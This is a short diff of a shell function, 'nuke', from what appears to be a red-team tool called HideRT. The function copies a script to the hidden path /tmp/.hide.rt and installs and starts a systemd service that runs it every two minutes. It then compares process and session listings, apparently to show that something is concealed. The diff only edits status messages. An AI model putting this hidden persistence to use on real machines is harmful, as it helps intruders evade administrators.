@@ -14,8 +14,8 @@ nuke(){
         echo "lets take a look at all of the current running processes";sleep 5
         ps aux;sleep 5;echo;echo "copying script and service";sleep 5
         cp -v $CURDIR/HideRT.sh /tmp/.hide.rt;cp -v $CURDIR/HideRT.service /etc/systemd/system/HideRT.service
-        echo;echo "enabling/starting/checking HideRT.Service (this might take a minute)"
-        systemctl enable HideRT;sleep 5;systemctl start HideRT;sleep 5;systemctl status HideRT;sleep 5
+        echo;echo "enabling/starting/checking HideRT.Service (this will take a good minute, just wait please..)"
+        systemctl enable HideRT;sleep 5;systemctl start HideRT;sleep 5;systemctl status HideRT;sleep 5;echo "Should say not running as it will only run every 2 minutes"
         echo;echo "lets take a look at all of the running processes now";sleep 5
         ps aux;sleep 5;echo;echo "lets check all seen user sessions";sleep 5;w;sleep 5
         echo;echo "All set :)"
